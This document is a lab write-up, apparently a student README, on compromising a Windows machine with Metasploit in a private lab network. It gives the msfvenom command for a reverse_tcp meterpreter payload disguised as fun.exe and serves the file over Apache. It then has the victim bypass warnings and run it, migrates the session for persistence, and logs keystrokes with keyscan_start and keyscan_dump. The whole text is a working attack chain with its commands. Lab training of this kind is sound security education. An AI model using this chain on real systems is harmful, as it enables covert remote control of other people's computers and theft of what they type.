# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
Find the attackers ip address using ifconfig
### OUTPUT
![output1](https://github.com/viswapriyaG/Compromising-windows-using-Metasploit/assets/131427787/ddd8fb05-b303-4325-9a04-fcacb619212d)

Create a malicious executable file fun.exe using msfvenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
### OUTPUT
![output2](https://github.com/viswapriyaG/Compromising-windows-using-Metasploit/assets/131427787/5ca8eda2-34af-46f3-8314-d833e4f8ef94)

copy the fun.exe into the apache /var/www/html folder
![output3](https://github.com/viswapriyaG/Compromising-windows-using-Metasploit/assets/131427787/95ef7221-1f2f-4dd7-bf2a-275d9ae228e2)


Start apache server
sudo systemctl apache2 start
![output4](https://github.com/viswapriyaG/Compromising-windows-using-Metasploit/assets/131427787/60283a2f-6151-4ef0-9787-80ca07b0813f)

Check the status of apache2
![output5](https://github.com/viswapriyaG/Compromising-windows-using-Metasploit/assets/131427787/15a4310c-53fb-4d4b-9cbb-5197e04267a2)

Invoke msfconsole:
## OUTPUT:

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
Starting a command and control Server
![output6](https://github.com/viswapriyaG/Compromising-windows-using-Metasploit/assets/131427787/6edb6ad6-e7b3-499f-825a-3cc7b9755497)

set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit
On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe
The file "fun.exe" downloads. 
![output7](https://github.com/viswapriyaG/Compromising-windows-using-Metasploit/assets/131427787/4c3aba77-9ffd-4b65-b368-7e12a2a950c1)

Bypass any warning boxes, double-click the file, and allow it to run.
On kali give the command exploit
![output8](https://github.com/viswapriyaG/Compromising-windows-using-Metasploit/assets/131427787/6df34384-4d46-45dc-bdcd-bc803254f5b5)

To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156
![output9](https://github.com/viswapriyaG/Compromising-windows-using-Metasploit/assets/131427787/84e2c2ee-bf5b-4637-822a-478cb9df9d16)

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe
at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 

![output10](https://github.com/viswapriyaG/Compromising-windows-using-Metasploit/assets/131427787/390dc2bf-96dd-4951-a17d-3d8bfb80811e)


Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
![output11](https://github.com/viswapriyaG/Compromising-windows-using-Metasploit/assets/131427787/d12cda23-1546-432d-898c-fc8892e4851c)


keyscan_dump	Shows the keystrokes captured so far
![output12](https://github.com/viswapriyaG/Compromising-windows-using-Metasploit/assets/131427787/9a4ffe75-1988-4bb1-aced-26986f8edac3)



## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
